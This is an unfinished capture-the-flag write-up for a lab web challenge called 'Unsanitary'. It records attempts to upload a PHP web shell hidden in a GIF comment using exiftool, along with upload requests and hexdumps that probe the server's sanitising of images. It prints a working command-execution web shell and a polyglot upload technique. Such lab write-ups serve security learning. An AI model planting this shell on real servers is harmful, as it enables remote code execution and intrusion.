# Unsanitary

## Web: 500 Points

## Challenge

My friend thinks his GIF file sharing website is secure. It's still under construction and needs a lot of work, but he wants to know if it's vulnerable. Can you hack into his website?

[ [Start](http://challenges.laptophackingcoffee.org:6464/) ]

Note: The server resets to default every 30 minutes. All progress will be lost

## Solution

https://www.youtube.com/watch?v=nNB9XlRfvzw
https://superuser.com/questions/556315/gif-image-exif-tags
```
exiftool -comment="This is a comment!" Sample.gif
```

```
$ exiftool -comment="<h1>hello world<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" cat-shell.gif 

1 image files updated
```

http://challenges.laptophackingcoffee.org:6464/images/cat-shell.gif.php
```
Warning: Unexpected character in input: '' (ASCII=3) state=0 in /var/www/app/images/cat-shell.gif.php on line 143

Parse error: syntax error, unexpected '=' in /var/www/app/images/cat-shell.gif.php on line 143
```

exiftool:
```
$ exiftool untitled.gif.php 
ExifTool Version Number         : 11.88
File Name                       : untitled.gif.php
Directory                       : .
File Size                       : 189 bytes
File Modification Date/Time     : 2020:07:14 22:44:01-06:00
File Access Date/Time           : 2020:07:14 22:47:34-06:00
File Inode Change Date/Time     : 2020:07:14 22:47:16-06:00
File Permissions                : rw-rw-r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 1
Image Height                    : 1
Has Color Map                   : Yes
Color Resolution Depth          : 1
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : <h1>hello world<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>
Image Size                      : 1x1
Megapixels                      : 0.000001
```

burpsuite
```
POST / HTTP/1.1
Host: challenges.laptophackingcoffee.org:6464
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenges.laptophackingcoffee.org:6464/
Content-Type: multipart/form-data; boundary=---------------------------36969556719905097901151866452
Content-Length: 424
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------36969556719905097901151866452
Content-Disposition: form-data; name="upfile"; filename="untitled.gif.php"
Content-Type: application/x-php

GIF89a
```

https://github.com/tennc/webshell/blob/master/php/gif.php
https://github.com/tennc/webshell/blob/master/php/gif.php

```
$ exiftool -comment="<h1>hello world<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" cat-shell.gif 

1 image files updated
```

isolate what the website is checking

test.gif (empty file)
```
Image type not supported, GIF files only!
```

file with GIF87a, with no other content. test.txt:
```
Image type not supported, GIF files only!
```

file with GIF87a, with no other content. test.gif:
```
Image type not supported, GIF files only!
```

2x2 gif made with GIMP:
```
Path: images/test.gif, image upload successful!
```

Visit url and it displays the image: 

http://challenges.laptophackingcoffee.org:6464/images/test.gif


2x2 gif with .php extension
```
Path: images/test.gif.php, image upload successful!
```

http://challenges.laptophackingcoffee.org:6464/images/test.gif.php
```
GIF87a����,;
```


```
$ cat test.gif.php
GIF89a����,
           ;<?phpinfo();?>
```


Before uploading to LHC
```
z@z-pc:~/Documents/playgrounds/LaptopHackingCoffee/Web/Unsanitary$ hexdump -C test3.php
00000000  47 49 46 38 39 61 1e 00  1e 00 80 00 00 ff ff ff  |GIF89a..........|
00000010  ff ff ff 21 fe 11 43 72  65 61 74 65 64 20 77 69  |...!..Created wi|
00000020  74 68 20 47 49 4d 50 00  2c 00 00 00 00 1e 00 1e  |th GIMP.,.......|
00000030  00 00 02 1c 84 8f a9 cb  ed 0f a3 9c b4 da 8b b3  |................|
00000040  de bc fb 0f 86 e2 48 96  e6 89 a6 ea ca b6 6b 01  |......H.......k.|
00000050  00 3b   
```

After downloading from LHC:
http://challenges.laptophackingcoffee.org:6464/images/test3.php
```
z@z-pc:~/Documents/playgrounds/LaptopHackingCoffee/Web/Unsanitary$ hexdump -C test3.php.1 
00000000  47 49 46 38 37 61 1e 00  1e 00 80 00 00 ff ff ff  |GIF87a..........|
00000010  ff ff ff 2c 00 00 00 00  1e 00 1e 00 00 02 1c 84  |...,............|
00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
00000030  e2 48 96 e6 89 a6 ea ca  b6 6b 01 00 3b           |.H.......k..;|
0000003d
```
The website strips the comment and converts the file from version 89a to 87a. However, if there is no comment then the website does not convert the file.

I think the website is also checking the image size:

https://www.php.net/manual/en/function.getimagesize.php

A modified version of test5.gif. It includes a `<?` in the file.
```
z@z-pc:~/Documents/playgrounds/LaptopHackingCoffee/Web/Unsanitary$ hexdump -C test5.gif.php
00000000  47 49 46 38 39 61 08 00  08 00 a1 01 3c 3f 00 00  |GIF89a......<?..|
00000010  ff ff ff ff ff ff ff ff  ff 21 f9 04 01 0a 00 02  |.........!......|
00000020  00 2c 00 00 00 00 08 00  08 00 00 02 0c 44 8c 71  |.,...........D.q|
00000030  8b 99 cc dc 82 8d 2a 09  0a 00 3b 0a              |......*...;.|
0000003c
```

Web removed the invalid `<?` characters and some of `0xff` bytes.
```
z@z-pc:~/Documents/playgrounds/LaptopHackingCoffee/Web/Unsanitary$ hexdump -C test5.gif.php.1 
00000000  47 49 46 38 39 61 08 00  08 00 80 00 00 3f 00 00  |GIF89a.......?..|
00000010  ff ff ff 21 f9 04 01 00  00 02 00 2c 00 00 00 00  |...!.......,....|
00000020  08 00 08 00 00 02 0c 44  8c 71 8b 99 cc dc 82 8d  |.......D.q......|
00000030  2a 09 0a 00 3b                                    |*...;|
00000035
```

https://resources.infosecinstitute.com/null-byte-injection-php/#gref

from itsqrank in LHC channel:
```
Can anyone help point me in the right direction on Unsanitary? I've been able to upload PHP files, however, it strips my PHP out when I make it with gifsicle. So I was researching why it would do that and I found another write up where a guy was having the same issue, he had a sample gif and it executes code fine. He wrote a python script to compare files to find out to fit his code in. Is that really the best way to accomplish this one? I don't want to learn Python right at this moment lol.
```